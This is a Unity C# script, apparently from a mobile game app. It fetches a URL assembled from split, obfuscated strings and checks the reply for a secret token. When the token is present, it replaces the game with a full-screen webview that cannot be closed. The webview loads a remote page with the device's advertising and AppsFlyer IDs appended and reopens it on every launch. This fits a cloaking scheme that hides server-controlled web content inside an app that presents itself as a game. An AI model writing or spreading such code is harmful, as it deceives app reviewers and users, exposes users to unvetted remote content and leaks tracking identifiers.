using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainTXC : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string odinTXCname = "";
    [HideInInspector] public string dvaTXCname = "";      
         
    
    private void linenTXCkind(string UrlTXCallusion, string NamingTXC = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _connectionTXC = gameObject.AddComponent<UniWebView>();
        _connectionTXC.SetToolbarDoneButtonText("");
        switch (NamingTXC)
        {
            case "0":
                _connectionTXC.SetShowToolbar(true, false, false, true);
                break;
            default:
                _connectionTXC.SetShowToolbar(false);
                break;
        }
        _connectionTXC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _connectionTXC.OnShouldClose += (view) =>
        {
            return false;
        };
        _connectionTXC.SetSupportMultipleWindows(true);
        _connectionTXC.SetAllowBackForwardNavigationGestures(true);
        _connectionTXC.OnMultipleWindowOpened += (view, windowId) =>
        {
            _connectionTXC.SetShowToolbar(true);

        };
        _connectionTXC.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingTXC)
            {
                case "0":
                    _connectionTXC.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _connectionTXC.SetShowToolbar(false);
                    break;
            }
        };
        _connectionTXC.OnOrientationChanged += (view, orientation) =>
        {
            _connectionTXC.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _connectionTXC.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlTXCallusion", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlTXCallusion", url);
            }
        };
        _connectionTXC.Load(UrlTXCallusion);
        _connectionTXC.Show();
    }

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaTXC") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odinTXCname = advertisingId; });
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlTXCallusion", string.Empty) != string.Empty)
            {
                linenTXCkind(PlayerPrefs.GetString("UrlTXCallusion"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    dvaTXCname += n;
                }
                StartCoroutine(IENUMENATORTXC());
            }
        }
        else
        {
            MarkTXC();
        }
    }


    private IEnumerator IENUMENATORTXC()
    {
        using (UnityWebRequest txc = UnityWebRequest.Get(dvaTXCname))
        {

            yield return txc.SendWebRequest();
            if (txc.isNetworkError)
            {
                MarkTXC();
            }
            int figureTXC = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && figureTXC > 0)
            {
                yield return new WaitForSeconds(1);
                figureTXC--;
            }
            try
            {
                if (txc.result == UnityWebRequest.Result.Success)
                {
                    if (txc.downloadHandler.text.Contains("ThXbllchllngLWJWnsd"))
                    {

                        try
                        {
                            var subs = txc.downloadHandler.text.Split('|');
                            linenTXCkind(subs[0] + "?idfa=" + odinTXCname, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            linenTXCkind(txc.downloadHandler.text + "?idfa=" + odinTXCname + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        MarkTXC();
                    }
                }
                else
                {
                    MarkTXC();
                }
            }
            catch
            {
                MarkTXC();
            }
        }
    }

    private void MarkTXC()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Menu");
    }

}
